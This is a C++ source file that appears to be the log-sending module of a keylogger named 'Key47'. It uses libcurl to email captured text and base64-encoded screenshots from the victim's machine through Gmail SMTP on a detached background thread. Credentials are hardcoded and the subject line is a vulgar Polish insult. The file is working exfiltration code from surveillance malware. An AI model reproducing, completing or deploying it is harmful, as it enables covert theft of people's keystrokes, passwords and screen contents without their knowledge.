#include <iostream>
#include <thread>
#include <vector>
#include <numeric>

#include "curl/curl.h"
#include "sendemail.h"

//////////////////////////////////////////////////////////////////

#define FROM            "example@gmail.com"
#define TO              "example@gmail.com"
#define USER_AGENT      "key47"
#define SUBJECT         "Na chuj napierdalasz w te drzwi kurwa psychopatko jebana"

const char *mail_url      = "smtp://smtp.gmail.com:587";
const char *mail_username = "example@gmail.com";
const char *mail_password = "sup3r_s3cr3t-p4ssw0rd";

//////////////////////////////////////////////////////////////////

static char *payload_text[BUFSIZ*10] = {nullptr};


int perform_send();
void sendemail(const std::string& body);
std::vector<std::string> explode(
        const std::string& str,
        const char& ch
);
void sendemail_attach(std::string *att_base64);
static size_t payload_source(
        void* ptr,
        size_t size,
        size_t nmemb,
        void* userp
);

struct upload_status {
    int lines_read;
};

CURL *curl = nullptr;
CURLcode res = CURLE_OK;
struct curl_slist *recipients = nullptr;
struct upload_status upload_ctx{};

void sendemailThread(const std::string& body) {
    std::thread hThread(sendemail, body);

    hThread.detach();
}

void sendemailThread_attach(std::string *att_base64) {
    sendemail_attach(att_base64);
}

static size_t payload_source(void* ptr, size_t size, size_t nmemb, void *userp) {
    auto *ctx = (struct upload_status*)userp;
    const char *data;


    if ((size == 0) || (nmemb == 0) || ((size * nmemb) < 1)) {
        return 0;
    }

    data = payload_text[ctx->lines_read];

    if (data) {
        size_t len = strlen(data);
        memcpy(ptr, data, len);
        ctx->lines_read++;

        return len;
    }

    return 0;
}

void sendemail(const std::string& body) {

    std::vector<char*> n_payload{
            (char*)"To: " TO "\r\n",
            (char*)"From: " FROM "(Key47 log sender)\r\n",
            (char*)"Subject: " SUBJECT "\r\n",
            (char*)"User-Agent: " USER_AGENT "\r\n",
            (char*)"MIME-Version: 1.0\r\n",
            (char*)"Content-Type: multipart/mixed;\r\n",
            (char*)" boundary=\"------------030203080101020302070708\"\r\n",
            (char*)"This is a multi-part message in MIME format.\r\n"
            "--------------030203080101020302070708\r\n",
            (char*)"Content-Type: text/plain; charset=utf-8; format=flowed\r\n",
            (char*)"Content-Transfer-Encoding: 7bit\r\n",
            (char*)"\r\n", // empty line to divide headers from body, see RFC5322
            (char*)body.c_str(),
            (char*)"\r\n",
            (char*)"--------------030203080101020302070708--\r\n"
    };

    n_payload.shrink_to_fit();
    int i = 0;
    for (const auto& n : n_payload) {
        payload_text[i] = n;
        i++;
    }

    perform_send();
}


void sendemail_attach(std::string *att_base64) {

    std::vector<char*> n_payload{
            (char*)"To: " TO "\r\n",
            (char*)"From: " FROM "(Key47 log sender)\r\n",
            (char*)"Subject: " SUBJECT "\r\n",
            (char*)"User-Agent: " USER_AGENT "\r\n",
            (char*)"MIME-Version: 1.0\r\n",
            (char*)"Content-Type: multipart/mixed;\r\n",
            (char*)" boundary=\"------------030203080101020302070708\"\r\n",
            (char*)"This is a multi-part message in MIME format.\r\n"
            "--------------030203080101020302070708\r\n",
            (char*)"Content-Type: text/plain; charset=utf-8; format=flowed\r\n",
            (char*)"Content-Transfer-Encoding: 7bit\r\n",
            (char*)"\r\n", // empty line to divide headers from body, see RFC5322
            (char*)" \r\n",
            (char*)"\r\n",
    };

    int chunk_size = 152;
    for (int x = 1; x < ( att_base64->length() / chunk_size); x++) {
        att_base64->insert((x * chunk_size), "\r");
    }

    std::vector<std::string> payload = explode(*att_base64, '\r');

    n_payload.push_back((char*)"--------------030203080101020302070708\r\n");
    n_payload.push_back((char*)"Content-Type: image/png; name=screenshot.png\r\n");
    n_payload.push_back((char*)"Content-Transfer-Encoding: base64\r\n");
    n_payload.push_back((char*)"Content-Disposition: attachment; filename=\"screenshot.png\"\r\n");
    n_payload.push_back((char*)"\r\n");

    for (const auto& p_elem : payload) {
        n_payload.push_back((char*)p_elem.data());
    }

    n_payload.push_back((char*)"\r\n");
    n_payload.push_back((char*)"--------------030203080101020302070708--\r\n");
    n_payload.push_back(nullptr);

    n_payload.shrink_to_fit();
    int i = 0;
    for (const auto& n : n_payload) {
        payload_text[i] = n;
        i++;
    }

    perform_send();
}

int perform_send() {
    upload_ctx.lines_read = 0;
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_USERNAME, mail_username);
        curl_easy_setopt(curl, CURLOPT_PASSWORD, mail_password);

        curl_easy_setopt(curl, CURLOPT_URL, mail_url);
        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)(CURLUSESSL_ALL));

        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM);

        recipients = curl_slist_append(recipients, TO);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
        curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                    curl_easy_strerror(res));

        curl_easy_cleanup(curl);
    }
    return (int)res;
}

std::vector<std::string> explode(const std::string& str, const char& ch) {
    std::string next;
    std::vector<std::string> result;

    for (std::_String_const_iterator<std::_String_val<std::_Simple_types<char>>>::value_type it : str) {
        if (it == ch) {
            if (!next.empty()) {
                result.push_back(next);
                next.clear();
            }
        } else {
            next += it;
        }
    }
    if (!next.empty())
        result.push_back(next);
    return result;
}